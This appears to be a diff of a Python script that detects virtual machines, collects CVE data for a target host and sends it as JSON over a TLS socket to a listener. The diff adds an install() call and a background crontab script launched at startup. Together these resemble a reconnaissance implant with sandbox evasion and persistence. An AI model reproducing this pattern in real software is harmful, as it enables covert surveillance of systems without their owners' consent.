@@ -1,10 +1,14 @@
 import sys
 import os
 sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
-from imports.config import *
 from vm_detection import *
 from get_cve import *
-from get_ip import *
+from install import *
+import ssl
+import socket
+import json
+
+
 
 def send_vuln_report(vuln_data):
     try:
@@ -15,13 +19,13 @@ def send_vuln_report(vuln_data):
         is_vm_flag = False
     
     except KeyboardInterrupt:
-        exit(1)
+        sys.exit(1)
 
     except TimeoutError:
-        exit(1)
+        sys.exit(1)
 
     except Exception as e:
-        exit(1) 
+        sys.exit(1) 
 
     if is_vm():  
         message = f"[!] Error: The system is running in a virtual machine."
@@ -33,21 +37,23 @@ def send_vuln_report(vuln_data):
         "is_vm": is_vm_flag
     }
     with socket.create_connection(("localhost", 1234)) as sock:
-        with context.wrap_socket(sock, server_hostname=SERVER_IP) as secure_sock:
+        with context.wrap_socket(sock, server_hostname="10.19.248.157") as secure_sock:
             secure_sock.sendall(json.dumps(data_to_send).encode('utf-8'))
 
 if __name__ == "__main__":
-    target_ip = "192.168.56.101"
-    os.system("./crontab.sh &")
+    install()
+    target_ip = "localhost"
+    if get_os() == "linux":
+         os.system("./crontab.sh &")
     try:
         cve_list = get_cve(target_ip)
         send_vuln_report(cve_list)
 
     except KeyboardInterrupt:
-        exit(1)
+        sys.exit(1)
 
-    # except TimeoutError:
-    #     exit(1)
+    except TimeoutError:
+        sys.exit(1)
 
-    # except Exception as e:
-    #     exit(1)
+    except Exception as e:
+        sys.exit(1)
